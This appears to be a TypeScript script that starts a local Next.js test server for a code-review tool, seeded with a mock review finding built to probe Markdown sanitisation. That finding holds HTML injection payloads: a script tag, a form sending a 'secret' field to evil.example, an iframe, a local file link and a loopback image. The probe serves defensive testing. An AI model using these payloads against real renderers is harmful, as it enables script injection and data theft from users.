import { createServer } from "node:http";
import next from "next";
import { installRuntimeForTests } from "@/src/server/runtime";
import { configureMr, createRuntimeHarness } from "../helpers/runtime";

const host = "127.0.0.1";
const port = 3210;
const origin = `http://${host}:${port}`;
process.env.REVIEWX_ORIGIN = origin;

const harness = await createRuntimeHarness();
configureMr(harness, "101", "1", "Security-sensitive parser update");
configureMr(harness, "101", "2", "Queue worker tests");
harness.reviewer.delayMs = 650;
harness.reviewer.results.set("1", {
  findings: [
    {
      severity: "major",
      body: [
        "### 🟠 Major: Unsafe Markdown probe",
        "",
        "The visible text is safe.",
        "",
        "<script>window.__reviewxInjected = true</script>",
        "",
        "<form action=\"https://evil.example\"><input name=\"secret\"></form>",
        "",
        "<iframe src=\"https://evil.example\"></iframe>",
        "",
        "[Local file](file:///C:/Windows/win.ini)",
        "![Loopback image](http://127.0.0.1:65535/private.png)",
        "![Public image](https://example.com/public.png)",
        "[Public documentation](https://example.com/docs)",
      ].join("\n"),
    },
    { severity: "suggestion", body: "### 🟢 Suggestion: Add a regression test\n\nKeep the parser behavior covered." },
  ],
});
harness.reviewer.results.set("2", { findings: [] });
installRuntimeForTests(harness.runtime);

const application = next({ dev: true, dir: process.cwd(), hostname: host, port });
await application.prepare();
const handler = application.getRequestHandler();
const server = createServer((request, response) => {
  if (request.headers.host !== `${host}:${port}`) {
    response.statusCode = 421;
    response.end("Invalid Host");
    return;
  }
  void handler(request, response);
});
await new Promise<void>((resolve, reject) => {
  server.once("error", reject);
  server.listen(port, host, resolve);
});

let stopping = false;
async function shutdown() {
  if (stopping) return;
  stopping = true;
  await harness.cleanup();
  await new Promise<void>((resolve) => server.close(() => resolve()));
}
process.once("SIGINT", () => void shutdown());
process.once("SIGTERM", () => void shutdown());
